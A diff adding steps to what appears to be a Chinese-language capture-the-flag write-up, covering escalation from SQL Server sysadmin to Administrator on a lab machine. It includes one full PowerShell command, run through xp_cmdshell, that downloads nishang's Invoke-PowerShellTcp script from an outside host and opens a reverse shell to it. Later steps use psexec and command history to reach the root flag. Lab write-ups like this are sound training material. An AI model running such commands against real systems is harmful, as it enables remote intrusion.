@@ -56,3 +56,38 @@ ELSE IF IS_SRVROLEMEMBER ('sysadmin') IS NULL
 
 当前权限为`sysadmin`
 
+开启`xp_cmdshell`
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141310630.png)
+
+网络状况
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141313585.png)
+
+在`C:\Users\sql_svc\Desktop\`找到`user flag`
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141401893.png)
+
+用[nishang](https://github.com/samratashok/nishang)反弹shell
+
+`xp_cmdshell "powershell IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.16.45:8000/Invoke-PowerShellTcp.ps1\");Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.45 -port 8080"`
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141417163.png)
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141419525.png)
+
+[命令历史记录](https://docs.microsoft.com/zh-cn/powershell/module/psreadline/about/about_psreadline?view=powershell-7.2#command-history)
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141425669.png)
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141426667.png)
+
+psexec连接服务器
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141433819.png)
+
+手动开了3389但是连不上??
+
+在`C:\Users\Administrator\Desktop\`找到`root flag`
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141447271.png)
